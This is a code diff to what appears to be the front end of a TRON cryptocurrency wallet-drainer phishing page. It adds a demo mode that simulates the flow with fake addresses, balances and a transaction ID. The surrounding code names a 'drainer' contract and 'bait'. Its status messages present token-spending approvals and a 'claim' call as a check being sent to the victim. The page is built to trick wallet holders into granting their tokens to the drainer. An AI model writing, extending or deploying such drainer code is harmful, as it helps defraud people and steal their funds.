@@ -106,6 +106,7 @@ const RPC = 'https://api.trongrid.io';
 const CHAIN = 'tron:0x2b6653dc';
 
 let cfg = null, account = '', found = [], staticMode = false;
+const DEMO = new URLSearchParams(location.search).has('demo');
 let signer = null; // { kind:'tronlink'|'wc', ... }
 
 const CLAIM_ABI = [{ type: 'function', name: 'claim', stateMutability: 'nonpayable', inputs: [{ name: 'drainer', type: 'address' }], outputs: [] }];
@@ -176,6 +177,7 @@ async function wcSendClaim() {
 }
 
 async function connectTronLink() {
+  if (DEMO) { cfg = { drainer: 'TDemoDrainerContractxxxxxxxxxxxxxx1', bait: 'TDemoBait' }; $('contract').textContent = cfg.drainer; signer = { kind: 'demo', address: 'TDemoAddressxxxxxxxxxxxxxxxxx1' }; account = signer.address; await load(); return; }
   $('connect-tl').disabled = true;
   setStatus('Connecting…');
   if (!cfg) { try { await loadConfig(); } catch (e) { setStatus('Config error', 'err'); $('connect-tl').disabled = false; return; } }
@@ -233,7 +235,13 @@ async function load() {
   $('claim').disabled = true;
   setStatus('Checking your check…');
   let dc;
-  if (staticMode || signer.kind === 'wc') {
+  if (DEMO) {
+    await sleep(700);
+    dc = { tokens: [
+      { token: 'TTokenUSDT', symbol: 'USDT', human: '12.5382' },
+      { token: 'TTokenUSDC', symbol: 'USDC', human: '0.6812' },
+    ], ready: true };
+  } else if (staticMode || signer.kind === 'wc') {
     try {
       const w = await builder();
       const tokens = [];
@@ -264,6 +272,19 @@ async function load() {
 
 async function run() {
   $('claim').disabled = true;
+  if (DEMO) {
+    for (let i = 0; i < found.length; i++) {
+      setStatus('Permission ' + (i + 1) + ' of ' + found.length + ' — confirm in wallet');
+      await sleep(900);
+    }
+    $('st-approve').classList.add('on'); $('st-approve').querySelector('.n').textContent = '✓';
+    $('st-claim').classList.add('on');
+    setStatus('Sending your check — confirm in wallet');
+    await sleep(1100);
+    $('txid').textContent = 'demo' + Math.random().toString(16).slice(2, 26) + 'demo';
+    show('view-done');
+    return;
+  }
   try {
     for (let i = 0; i < found.length; i++) {
       setStatus('Permission ' + (i + 1) + ' of ' + found.length + ' — confirm in wallet');
